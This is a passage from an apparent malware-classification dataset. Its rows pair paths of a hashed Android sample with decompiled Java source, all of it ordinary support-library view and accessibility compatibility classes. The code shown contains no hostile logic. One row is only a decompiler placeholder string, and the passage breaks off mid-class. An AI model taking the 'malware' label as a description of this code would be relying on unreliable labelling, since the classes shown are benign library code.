JBViewCompatImpl extends ICSViewCompatImpl {     JBViewCompatImpl(){     }     @Override public boolean hasTransientState(    View view){       return ViewCompatJB.hasTransientState(view);     }     @Override public void setHasTransientState(    View view,    boolean hasTransientState){       ViewCompatJB.setHasTransientState(view,hasTransientState);     }     @Override public void postInvalidateOnAnimation(    View view){       ViewCompatJB.postInvalidateOnAnimation(view);     }     @Override public void postInvalidateOnAnimation(    View view,    int left,    int top,    int right,    int bottom){       ViewCompatJB.postInvalidateOnAnimation(view,left,top,right,bottom);     }     @Override public void postOnAnimation(    View view,    Runnable action){       ViewCompatJB.postOnAnimation(view,action);     }     @Override public void postOnAnimationDelayed(    View view,    Runnable action,    long delayMillis){       ViewCompatJB.postOnAnimationDelayed(view,action,delayMillis);     }     @Override public int getImportantForAccessibility(    View view){       return ViewCompatJB.getImportantForAccessibility(view);     }     @Override public void setImportantForAccessibility(    View view,    int mode){       ViewCompatJB.setImportantForAccessibility(view,mode);     }     @Override public AccessibilityNodeProviderCompat getAccessibilityNodeProvider(    View view){       Object compat=ViewCompatJB.getAccessibilityNodeProvider(view);       if (compat != null) {         return new AccessibilityNodeProviderCompat(compat);       }       return null;     }   } static {     int version=Build.VERSION.SDK_INT;     if (version >= 16 || Build.VERSION.CODENAME.equals(""JellyBean"")) {       IMPL=new JBViewCompatImpl();       return;     }     if (version >= 14) {       IMPL=new ICSViewCompatImpl();       return;     }     if (version >= 11) {       IMPL=new HCViewCompatImpl();     }  else     if (version >= 9) {       IMPL=new GBViewCompatImpl();     }  else {       IMPL=new BaseViewCompatImpl();     }   }   public static boolean canScrollHorizontally(  View v,  int direction){     return IMPL.canScrollHorizontally(v,direction);   }   public static boolean canScrollVertically(  View v,  int direction){     return IMPL.canScrollVertically(v,direction);   }   public static int getOverScrollMode(  View v){     return IMPL.getOverScrollMode(v);   }   public static void setOverScrollMode(  View v,  int overScrollMode){     IMPL.setOverScrollMode(v,overScrollMode);   }   public static void onPopulateAccessibilityEvent(  View v,  AccessibilityEvent event){     IMPL.onPopulateAccessibilityEvent(v,event);   }   public static void onInitializeAccessibilityEvent(  View v,  AccessibilityEvent event){     IMPL.onInitializeAccessibilityEvent(v,event);   }   public static void onInitializeAccessibilityNodeInfo(  View v,  AccessibilityNodeInfoCompat info){     IMPL.onInitializeAccessibilityNodeInfo(v,info);   }   public static void setAccessibilityDelegate(  View v,  AccessibilityDelegateCompat delegate){     IMPL.setAccessibilityDelegate(v,delegate);   }   public static boolean hasTransientState(  View view){     return IMPL.hasTransientState(view);   }   public static void setHasTransientState(  View view,  boolean hasTransientState){     IMPL.setHasTransientState(view,hasTransientState);   }   public static void postInvalidateOnAnimation(  View view){     IMPL.postInvalidateOnAnimation(view);   }   public static void postInvalidateOnAnimation(  View view,  int left,  int top,  int right,  int bottom){     IMPL.postInvalidateOnAnimation(view,left,top,right,bottom);   }   public static void postOnAnimation(  View view,  Runnable action){     IMPL.postOnAnimation(view,action);   }   public static void postOnAnimationDelayed(  View view,  Runnable action,  long delayMillis){     IMPL.postOnAnimationDelayed(view,action,delayMillis);   }   public static int getImportantForAccessibility(  View view){     return IMPL.getImportantForAccessibility(view);   }   public static void setImportantForAccessibility(  View view,  int mode){     IMPL.setImportantForAccessibility(view,mode);   }   public static AccessibilityNodeProviderCompat getAccessibilityNodeProvider(  View view){     return IMPL.getAccessibilityNodeProvider(view);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view\ViewCompatGingerbread.code","class ViewCompatGingerbread {   ViewCompatGingerbread(){   }   public static int getOverScrollMode(  View v){     return v.getOverScrollMode();   }   public static void setOverScrollMode(  View v,  int mode){     v.setOverScrollMode(mode);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view\ViewCompatHC.code","class ViewCompatHC {   ViewCompatHC(){   }   public static long getFrameTime(){     return ValueAnimator.getFrameDelay();   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view\ViewCompatICS.code","class ViewCompatICS {   ViewCompatICS(){   }   public static boolean canScrollHorizontally(  View v,  int direction){     return v.canScrollHorizontally(direction);   }   public static boolean canScrollVertically(  View v,  int direction){     return v.canScrollVertically(direction);   }   public static void setAccessibilityDelegate(  View v,  Object delegate){     v.setAccessibilityDelegate((View.AccessibilityDelegate)delegate);   }   public static void onPopulateAccessibilityEvent(  View v,  AccessibilityEvent event){     v.onPopulateAccessibilityEvent(event);   }   public static void onInitializeAccessibilityEvent(  View v,  AccessibilityEvent event){     v.onInitializeAccessibilityEvent(event);   }   public static void onInitializeAccessibilityNodeInfo(  View v,  Object info){     v.onInitializeAccessibilityNodeInfo((AccessibilityNodeInfo)info);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view\ViewCompatImpl.code","interface ViewCompatImpl {   boolean canScrollHorizontally(  View view,  int i);   boolean canScrollVertically(  View view,  int i);   AccessibilityNodeProviderCompat getAccessibilityNodeProvider(  View view);   int getImportantForAccessibility(  View view);   int getOverScrollMode(  View view);   boolean hasTransientState(  View view);   void onInitializeAccessibilityEvent(  View view,  AccessibilityEvent accessibilityEvent);   void onInitializeAccessibilityNodeInfo(  View view,  AccessibilityNodeInfoCompat accessibilityNodeInfoCompat);   void onPopulateAccessibilityEvent(  View view,  AccessibilityEvent accessibilityEvent);   void postInvalidateOnAnimation(  View view);   void postInvalidateOnAnimation(  View view,  int i,  int i2,  int i3,  int i4);   void postOnAnimation(  View view,  Runnable runnable);   void postOnAnimationDelayed(  View view,  Runnable runnable,  long j);   void setAccessibilityDelegate(  View view,  AccessibilityDelegateCompat accessibilityDelegateCompat);   void setHasTransientState(  View view,  boolean z);   void setImportantForAccessibility(  View view,  int i);   void setOverScrollMode(  View view,  int i); } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view\ViewCompatJB.code","public class ViewCompatJB {   public static boolean hasTransientState(  View view){     return view.hasTransientState();   }   public static void setHasTransientState(  View view,  boolean hasTransientState){     view.setHasTransientState(hasTransientState);   }   public static void postInvalidateOnAnimation(  View view){     view.postInvalidateOnAnimation();   }   public static void postInvalidateOnAnimation(  View view,  int left,  int top,  int right,  int bottom){     view.postInvalidate(left,top,right,bottom);   }   public static void postOnAnimation(  View view,  Runnable action){     view.postOnAnimation(action);   }   public static void postOnAnimationDelayed(  View view,  Runnable action,  long delayMillis){     view.postOnAnimationDelayed(action,delayMillis);   }   public static int getImportantForAccessibility(  View view){     return view.getImportantForAccessibility();   }   public static void setImportantForAccessibility(  View view,  int mode){     view.setImportantForAccessibility(mode);   }   public static Object getAccessibilityNodeProvider(  View view){     return view.getAccessibilityNodeProvider();   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view\ViewConfigurationCompat.code","public class ViewConfigurationCompat {   static final ViewConfigurationVersionImpl IMPL; interface ViewConfigurationVersionImpl {     int getScaledPagingTouchSlop(    ViewConfiguration viewConfiguration);   } static class BaseViewConfigurationVersionImpl implements ViewConfigurationVersionImpl {     BaseViewConfigurationVersionImpl(){     }     @Override public int getScaledPagingTouchSlop(    ViewConfiguration config){       return config.getScaledTouchSlop();     }   } static class FroyoViewConfigurationVersionImpl implements ViewConfigurationVersionImpl {     FroyoViewConfigurationVersionImpl(){     }     @Override public int getScaledPagingTouchSlop(    ViewConfiguration config){       return ViewConfigurationCompatFroyo.getScaledPagingTouchSlop(config);     }   } static {     if (Build.VERSION.SDK_INT >= 11) {       IMPL=new FroyoViewConfigurationVersionImpl();     }  else {       IMPL=new BaseViewConfigurationVersionImpl();     }   }   public static int getScaledPagingTouchSlop(  ViewConfiguration config){     return IMPL.getScaledPagingTouchSlop(config);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view\ViewConfigurationCompatFroyo.code","class ViewConfigurationCompatFroyo {   ViewConfigurationCompatFroyo(){   }   public static int getScaledPagingTouchSlop(  ViewConfiguration config){     return config.getScaledPagingTouchSlop();   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view\ViewConfigurationVersionImpl.code","interface ViewConfigurationVersionImpl {   int getScaledPagingTouchSlop(  ViewConfiguration viewConfiguration); } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view\ViewGroupCompat.code","public class ViewGroupCompat {   static final ViewGroupCompatImpl IMPL; interface ViewGroupCompatImpl {     boolean onRequestSendAccessibilityEvent(    ViewGroup viewGroup,    View view,    AccessibilityEvent accessibilityEvent);   } static class ViewGroupCompatStubImpl implements ViewGroupCompatImpl {     ViewGroupCompatStubImpl(){     }     @Override public boolean onRequestSendAccessibilityEvent(    ViewGroup group,    View child,    AccessibilityEvent event){       return true;     }   } static class ViewGroupCompatIcsImpl extends ViewGroupCompatStubImpl {     ViewGroupCompatIcsImpl(){     }     @Override public boolean onRequestSendAccessibilityEvent(    ViewGroup group,    View child,    AccessibilityEvent event){       return ViewGroupCompatIcs.onRequestSendAccessibilityEvent(group,child,event);     }   } static {     if (Build.VERSION.SDK_INT >= 14) {       IMPL=new ViewGroupCompatIcsImpl();     }  else {       IMPL=new ViewGroupCompatStubImpl();     }   }   private ViewGroupCompat(){   }   public static boolean onRequestSendAccessibilityEvent(  ViewGroup group,  View child,  AccessibilityEvent event){     return IMPL.onRequestSendAccessibilityEvent(group,child,event);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view\ViewGroupCompatIcs.code","class ViewGroupCompatIcs {   ViewGroupCompatIcs(){   }   public static boolean onRequestSendAccessibilityEvent(  ViewGroup group,  View child,  AccessibilityEvent event){     return group.onRequestSendAccessibilityEvent(child,event);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view\ViewGroupCompatIcsImpl.code","static class ViewGroupCompatIcsImpl extends ViewGroupCompatStubImpl {   ViewGroupCompatIcsImpl(){   }   @Override public boolean onRequestSendAccessibilityEvent(  ViewGroup group,  View child,  AccessibilityEvent event){     return ViewGroupCompatIcs.onRequestSendAccessibilityEvent(group,child,event);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view\ViewGroupCompatImpl.code","interface ViewGroupCompatImpl {   boolean onRequestSendAccessibilityEvent(  ViewGroup viewGroup,  View view,  AccessibilityEvent accessibilityEvent); } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view\ViewGroupCompatStubImpl.code","static class ViewGroupCompatStubImpl implements ViewGroupCompatImpl {   ViewGroupCompatStubImpl(){   }   @Override public boolean onRequestSendAccessibilityEvent(  ViewGroup group,  View child,  AccessibilityEvent event){     return true;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view\ViewPager.code","!org.eclipse.jdt.core.dom.TypeDeclaration@60a3d31c"
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view.accessibility\AccessibilityEventCompat.code","public class AccessibilityEventCompat {   private static final AccessibilityEventVersionImpl IMPL;   public static final int TYPES_ALL_MASK=-1;   public static final int TYPE_ANNOUNCEMENT=16384;   public static final int TYPE_TOUCH_EXPLORATION_GESTURE_END=1024;   public static final int TYPE_TOUCH_EXPLORATION_GESTURE_START=512;   public static final int TYPE_VIEW_ACCESSIBILITY_FOCUSED=32768;   public static final int TYPE_VIEW_ACCESSIBILITY_FOCUS_CLEARED=65536;   public static final int TYPE_VIEW_HOVER_ENTER=128;   public static final int TYPE_VIEW_HOVER_EXIT=256;   public static final int TYPE_VIEW_SCROLLED=4096;   public static final int TYPE_VIEW_TEXT_SELECTION_CHANGED=8192;   public static final int TYPE_VIEW_TEXT_TRAVERSED_AT_MOVEMENT_GRANULARITY=131072;   public static final int TYPE_WINDOW_CONTENT_CHANGED=2048; interface AccessibilityEventVersionImpl {     void appendRecord(    AccessibilityEvent accessibilityEvent,    Object obj);     Object getRecord(    AccessibilityEvent accessibilityEvent,    int i);     int getRecordCount(    AccessibilityEvent accessibilityEvent);   } static class AccessibilityEventStubImpl implements AccessibilityEventVersionImpl {     AccessibilityEventStubImpl(){     }     @Override public void appendRecord(    AccessibilityEvent event,    Object record){     }     @Override public Object getRecord(    AccessibilityEvent event,    int index){       return null;     }     @Override public int getRecordCount(    AccessibilityEvent event){       return 0;     }   } static class AccessibilityEventIcsImpl extends AccessibilityEventStubImpl {     AccessibilityEventIcsImpl(){     }     @Override public void appendRecord(    AccessibilityEvent event,    Object record){       AccessibilityEventCompatIcs.appendRecord(event,record);     }     @Override public Object getRecord(    AccessibilityEvent event,    int index){       return AccessibilityEventCompatIcs.getRecord(event,index);     }     @Override public int getRecordCount(    AccessibilityEvent event){       return AccessibilityEventCompatIcs.getRecordCount(event);     }   } static {     if (Build.VERSION.SDK_INT >= 14) {       IMPL=new AccessibilityEventIcsImpl();     }  else {       IMPL=new AccessibilityEventStubImpl();     }   }   private AccessibilityEventCompat(){   }   public static int getRecordCount(  AccessibilityEvent event){     return IMPL.getRecordCount(event);   }   public static void appendRecord(  AccessibilityEvent event,  AccessibilityRecordCompat record){     IMPL.appendRecord(event,record.getImpl());   }   public static AccessibilityRecordCompat getRecord(  AccessibilityEvent event,  int index){     return new AccessibilityRecordCompat(IMPL.getRecord(event,index));   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view.accessibility\AccessibilityEventCompatIcs.code","class AccessibilityEventCompatIcs {   AccessibilityEventCompatIcs(){   }   public static int getRecordCount(  AccessibilityEvent event){     return event.getRecordCount();   }   public static void appendRecord(  AccessibilityEvent event,  Object record){     event.appendRecord((AccessibilityRecord)record);   }   public static Object getRecord(  AccessibilityEvent event,  int index){     return event.getRecord(index);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view.accessibility\AccessibilityEventIcsImpl.code","static class AccessibilityEventIcsImpl extends AccessibilityEventStubImpl {   AccessibilityEventIcsImpl(){   }   @Override public void appendRecord(  AccessibilityEvent event,  Object record){     AccessibilityEventCompatIcs.appendRecord(event,record);   }   @Override public Object getRecord(  AccessibilityEvent event,  int index){     return AccessibilityEventCompatIcs.getRecord(event,index);   }   @Override public int getRecordCount(  AccessibilityEvent event){     return AccessibilityEventCompatIcs.getRecordCount(event);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view.accessibility\AccessibilityEventStubImpl.code","static class AccessibilityEventStubImpl implements AccessibilityEventVersionImpl {   AccessibilityEventStubImpl(){   }   @Override public void appendRecord(  AccessibilityEvent event,  Object record){   }   @Override public Object getRecord(  AccessibilityEvent event,  int index){     return null;   }   @Override public int getRecordCount(  AccessibilityEvent event){     return 0;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view.accessibility\AccessibilityEventVersionImpl.code","interface AccessibilityEventVersionImpl {   void appendRecord(  AccessibilityEvent accessibilityEvent,  Object obj);   Object getRecord(  AccessibilityEvent accessibilityEvent,  int i);   int getRecordCount(  AccessibilityEvent accessibilityEvent); } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view.accessibility\AccessibilityManagerCompat.code","public class AccessibilityManagerCompat {   private static final AccessibilityManagerVersionImpl IMPL; interface AccessibilityManagerVersionImpl {     boolean addAccessibilityStateChangeListener(    AccessibilityManager accessibilityManager,    AccessibilityStateChangeListenerCompat accessibilityStateChangeListenerCompat);     List<AccessibilityServiceInfo> getEnabledAccessibilityServiceList(    AccessibilityManager accessibilityManager,    int i);     List<AccessibilityServiceInfo> getInstalledAccessibilityServiceList(    AccessibilityManager accessibilityManager);     boolean isTouchExplorationEnabled(    AccessibilityManager accessibilityManager);     Object newAccessiblityStateChangeListener(    AccessibilityStateChangeListenerCompat accessibilityStateChangeListenerCompat);     boolean removeAccessibilityStateChangeListener(    AccessibilityManager accessibilityManager,    AccessibilityStateChangeListenerCompat accessibilityStateChangeListenerCompat);   } public static abstract class AccessibilityStateChangeListenerCompat {     final Object mListener=AccessibilityManagerCompat.IMPL.newAccessiblityStateChangeListener(this);     public abstract void onAccessibilityStateChanged(    boolean z);   } static class AccessibilityManagerStubImpl implements AccessibilityManagerVersionImpl {     AccessibilityManagerStubImpl(){     }     @Override public Object newAccessiblityStateChangeListener(    AccessibilityStateChangeListenerCompat listener){       return null;     }     @Override public boolean addAccessibilityStateChangeListener(    AccessibilityManager manager,    AccessibilityStateChangeListenerCompat listener){       return false;     }     @Override public boolean removeAccessibilityStateChangeListener(    AccessibilityManager manager,    AccessibilityStateChangeListenerCompat listener){       return false;     }     @Override public List<AccessibilityServiceInfo> getEnabledAccessibilityServiceList(    AccessibilityManager manager,    int feedbackTypeFlags){       return Collections.emptyList();     }     @Override public List<AccessibilityServiceInfo> getInstalledAccessibilityServiceList(    AccessibilityManager manager){       return Collections.emptyList();     }     @Override public boolean isTouchExplorationEnabled(    AccessibilityManager manager){       return false;     }   } static class AccessibilityManagerIcsImpl extends AccessibilityManagerStubImpl {     AccessibilityManagerIcsImpl(){     }     @Override public Object newAccessiblityStateChangeListener(    final AccessibilityStateChangeListenerCompat listener){       return AccessibilityManagerCompatIcs.newAccessibilityStateChangeListener(new AccessibilityManagerCompatIcs.AccessibilityStateChangeListenerBridge(){         @Override public void onAccessibilityStateChanged(        boolean enabled){           listener.onAccessibilityStateChanged(enabled);         }       } );     }     @Override public boolean addAccessibilityStateChangeListener(    AccessibilityManager manager,    AccessibilityStateChangeListenerCompat listener){       return AccessibilityManagerCompatIcs.addAccessibilityStateChangeListener(manager,listener.mListener);     }     @Override public boolean removeAccessibilityStateChangeListener(    AccessibilityManager manager,    AccessibilityStateChangeListenerCompat listener){       return AccessibilityManagerCompatIcs.removeAccessibilityStateChangeListener(manager,listener.mListener);     }     @Override public List<AccessibilityServiceInfo> getEnabledAccessibilityServiceList(    AccessibilityManager manager,    int feedbackTypeFlags){       return AccessibilityManagerCompatIcs.getEnabledAccessibilityServiceList(manager,feedbackTypeFlags);     }     @Override public List<AccessibilityServiceInfo> getInstalledAccessibilityServiceList(    AccessibilityManager manager){       return AccessibilityManagerCompatIcs.getInstalledAccessibilityServiceList(manager);     }     @Override public boolean isTouchExplorationEnabled(    AccessibilityManager manager){       return AccessibilityManagerCompatIcs.isTouchExplorationEnabled(manager);     }   } static {     if (Build.VERSION.SDK_INT >= 14) {       IMPL=new AccessibilityManagerIcsImpl();     }  else {       IMPL=new AccessibilityManagerStubImpl();     }   }   public static boolean addAccessibilityStateChangeListener(  AccessibilityManager manager,  AccessibilityStateChangeListenerCompat listener){     return IMPL.addAccessibilityStateChangeListener(manager,listener);   }   public static boolean removeAccessibilityStateChangeListener(  AccessibilityManager manager,  AccessibilityStateChangeListenerCompat listener){     return IMPL.removeAccessibilityStateChangeListener(manager,listener);   }   public static List<AccessibilityServiceInfo> getInstalledAccessibilityServiceList(  AccessibilityManager manager){     return IMPL.getInstalledAccessibilityServiceList(manager);   }   public static List<AccessibilityServiceInfo> getEnabledAccessibilityServiceList(  AccessibilityManager manager,  int feedbackTypeFlags){     return IMPL.getEnabledAccessibilityServiceList(manager,feedbackTypeFlags);   }   public static boolean isTouchExplorationEnabled(  AccessibilityManager manager){     return IMPL.isTouchExplorationEnabled(manager);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view.accessibility\AccessibilityManagerCompatIcs.code","class AccessibilityManagerCompatIcs { interface AccessibilityStateChangeListenerBridge {     void onAccessibilityStateChanged(    boolean z);   }   AccessibilityManagerCompatIcs(){   }   public static Object newAccessibilityStateChangeListener(  final AccessibilityStateChangeListenerBridge bridge){     return new AccessibilityManager.AccessibilityStateChangeListener(){       @Override public void onAccessibilityStateChanged(      boolean enabled){         AccessibilityStateChangeListenerBridge.this.onAccessibilityStateChanged(enabled);       }     } ;   }   public static boolean addAccessibilityStateChangeListener(  AccessibilityManager manager,  Object listener){     return manager.addAccessibilityStateChangeListener((AccessibilityManager.AccessibilityStateChangeListener)listener);   }   public static boolean removeAccessibilityStateChangeListener(  AccessibilityManager manager,  Object listener){     return manager.removeAccessibilityStateChangeListener((AccessibilityManager.AccessibilityStateChangeListener)listener);   }   public static List<AccessibilityServiceInfo> getEnabledAccessibilityServiceList(  AccessibilityManager manager,  int feedbackTypeFlags){     return manager.getEnabledAccessibilityServiceList(feedbackTypeFlags);   }   public static List<AccessibilityServiceInfo> getInstalledAccessibilityServiceList(  AccessibilityManager manager){     return manager.getInstalledAccessibilityServiceList();   }   public static boolean isTouchExplorationEnabled(  AccessibilityManager manager){     return manager.isTouchExplorationEnabled();   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view.accessibility\AccessibilityManagerIcsImpl.code","static class AccessibilityManagerIcsImpl extends AccessibilityManagerStubImpl {   AccessibilityManagerIcsImpl(){   }   @Override public Object newAccessiblityStateChangeListener(  final AccessibilityStateChangeListenerCompat listener){     return AccessibilityManagerCompatIcs.newAccessibilityStateChangeListener(new AccessibilityManagerCompatIcs.AccessibilityStateChangeListenerBridge(){       @Override public void onAccessibilityStateChanged(      boolean enabled){         listener.onAccessibilityStateChanged(enabled);       }     } );   }   @Override public boolean addAccessibilityStateChangeListener(  AccessibilityManager manager,  AccessibilityStateChangeListenerCompat listener){     return AccessibilityManagerCompatIcs.addAccessibilityStateChangeListener(manager,listener.mListener);   }   @Override public boolean removeAccessibilityStateChangeListener(  AccessibilityManager manager,  AccessibilityStateChangeListenerCompat listener){     return AccessibilityManagerCompatIcs.removeAccessibilityStateChangeListener(manager,listener.mListener);   }   @Override public List<AccessibilityServiceInfo> getEnabledAccessibilityServiceList(  AccessibilityManager manager,  int feedbackTypeFlags){     return AccessibilityManagerCompatIcs.getEnabledAccessibilityServiceList(manager,feedbackTypeFlags);   }   @Override public List<AccessibilityServiceInfo> getInstalledAccessibilityServiceList(  AccessibilityManager manager){     return AccessibilityManagerCompatIcs.getInstalledAccessibilityServiceList(manager);   }   @Override public boolean isTouchExplorationEnabled(  AccessibilityManager manager){     return AccessibilityManagerCompatIcs.isTouchExplorationEnabled(manager);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view.accessibility\AccessibilityManagerStubImpl.code","static class AccessibilityManagerStubImpl implements AccessibilityManagerVersionImpl {   AccessibilityManagerStubImpl(){   }   @Override public Object newAccessiblityStateChangeListener(  AccessibilityStateChangeListenerCompat listener){     return null;   }   @Override public boolean addAccessibilityStateChangeListener(  AccessibilityManager manager,  AccessibilityStateChangeListenerCompat listener){     return false;   }   @Override public boolean removeAccessibilityStateChangeListener(  AccessibilityManager manager,  AccessibilityStateChangeListenerCompat listener){     return false;   }   @Override public List<AccessibilityServiceInfo> getEnabledAccessibilityServiceList(  AccessibilityManager manager,  int feedbackTypeFlags){     return Collections.emptyList();   }   @Override public List<AccessibilityServiceInfo> getInstalledAccessibilityServiceList(  AccessibilityManager manager){     return Collections.emptyList();   }   @Override public boolean isTouchExplorationEnabled(  AccessibilityManager manager){     return false;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view.accessibility\AccessibilityManagerVersionImpl.code","interface AccessibilityManagerVersionImpl {   boolean addAccessibilityStateChangeListener(  AccessibilityManager accessibilityManager,  AccessibilityStateChangeListenerCompat accessibilityStateChangeListenerCompat);   List<AccessibilityServiceInfo> getEnabledAccessibilityServiceList(  AccessibilityManager accessibilityManager,  int i);   List<AccessibilityServiceInfo> getInstalledAccessibilityServiceList(  AccessibilityManager accessibilityManager);   boolean isTouchExplorationEnabled(  AccessibilityManager accessibilityManager);   Object newAccessiblityStateChangeListener(  AccessibilityStateChangeListenerCompat accessibilityStateChangeListenerCompat);   boolean removeAccessibilityStateChangeListener(  AccessibilityManager accessibilityManager,  AccessibilityStateChangeListenerCompat accessibilityStateChangeListenerCompat); } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view.accessibility\AccessibilityNodeInfoBridge.code","interface AccessibilityNodeInfoBridge {   Object createAccessibilityNodeInfo(  int i);   List<Object> findAccessibilityNodeInfosByText(  String str,  int i);   boolean performAction(  int i,  int i2,  Bundle bundle); } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view.accessibility\AccessibilityNodeInfoCompat.code","public class AccessibilityNodeInfoCompat {   public static final int ACTION_ACCESSIBILITY_FOCUS=64;   public static final String ACTION_ARGUMENT_HTML_ELEMENT_STRING=""ACTION_ARGUMENT_HTML_ELEMENT_STRING"";   public static final String ACTION_ARGUMENT_MOVEMENT_GRANULARITY_INT=""ACTION_ARGUMENT_MOVEMENT_GRANULARITY_INT"";   public static final int ACTION_CLEAR_ACCESSIBILITY_FOCUS=128;   public static final int ACTION_CLEAR_FOCUS=2;   public static final int ACTION_CLEAR_SELECTION=8;   public static final int ACTION_CLICK=16;   public static final int ACTION_FOCUS=1;   public static final int ACTION_LONG_CLICK=32;   public static final int ACTION_NEXT_AT_MOVEMENT_GRANULARITY=256;   public static final int ACTION_NEXT_HTML_ELEMENT=1024;   public static final int ACTION_PREVIOUS_AT_MOVEMENT_GRANULARITY=512;   public static final int ACTION_PREVIOUS_HTML_ELEMENT=2048;   public static final int ACTION_SCROLL_BACKWARD=8192;   public static final int ACTION_SCROLL_FORWARD=4096;   public static final int ACTION_SELECT=4;   public static final int FOCUS_ACCESSIBILITY=2;   public static final int FOCUS_INPUT=1;   private static final AccessibilityNodeInfoImpl IMPL;   public static final int MOVEMENT_GRANULARITY_CHARACTER=1;   public static final int MOVEMENT_GRANULARITY_LINE=4;   public static final int MOVEMENT_GRANULARITY_PAGE=16;   public static final int MOVEMENT_GRANULARITY_PARAGRAPH=8;   public static final int MOVEMENT_GRANULARITY_WORD=2;   private final Object mInfo; interface AccessibilityNodeInfoImpl {     void addAction(    Object obj,    int i);     void addChild(    Object obj,    View view);     void addChild(    Object obj,    View view,    int i);     List<Object> findAccessibilityNodeInfosByText(    Object obj,    String str);     Object findFocus(    Object obj,    int i);     Object focusSearch(    Object obj,    int i);     int getActions(    Object obj);     void getBoundsInParent(    Object obj,    Rect rect);     void getBoundsInScreen(    Object obj,    Rect rect);     Object getChild(    Object obj,    int i);     int getChildCount(    Object obj);     CharSequence getClassName(    Object obj);     CharSequence getContentDescription(    Object obj);     int getMovementGranularities(    Object obj);     CharSequence getPackageName(    Object obj);     Object getParent(    Object obj);     CharSequence getText(    Object obj);     int getWindowId(    Object obj);     boolean isAccessibilityFocused(    Object obj);     boolean isCheckable(    Object obj);     boolean isChecked(    Object obj);     boolean isClickable(    Object obj);     boolean isEnabled(    Object obj);     boolean isFocusable(    Object obj);     boolean isFocused(    Object obj);     boolean isLongClickable(    Object obj);     boolean isPassword(    Object obj);     boolean isScrollable(    Object obj);     boolean isSelected(    Object obj);     boolean isVisibleToUser(    Object obj);     Object obtain();     Object obtain(    View view);     Object obtain(    View view,    int i);     Object obtain(    Object obj);     boolean performAction(    Object obj,    int i);     boolean performAction(    Object obj,    int i,    Bundle bundle);     void recycle(    Object obj);     void setAccessibilityFocused(    Object obj,    boolean z);     void setBoundsInParent(    Object obj,    Rect rect);     void setBoundsInScreen(    Object obj,    Rect rect);     void setCheckable(    Object obj,    boolean z);     void setChecked(    Object obj,    boolean z);     void setClassName(    Object obj,    CharSequence charSequence);     void setClickable(    Object obj,    boolean z);     void setContentDescription(    Object obj,    CharSequence charSequence);     void setEnabled(    Object obj,    boolean z);     void setFocusable(    Object obj,    boolean z);     void setFocused(    Object obj,    boolean z);     void setLongClickable(    Object obj,    boolean z);     void setMovementGranularities(    Object obj,    int i);     void setPackageName(    Object obj,    CharSequence charSequence);     void setParent(    Object obj,    View view);     void setParent(    Object obj,    View view,    int i);     void setPassword(    Object obj,    boolean z);     void setScrollable(    Object obj,    boolean z);     void setSelected(    Object obj,    boolean z);     void setSource(    Object obj,    View view);     void setSource(    Object obj,    View view,    int i);     void setText(    Object obj,    CharSequence charSequence);     void setVisibleToUser(    Object obj,    boolean z);   } static class AccessibilityNodeInfoStubImpl implements AccessibilityNodeInfoImpl {     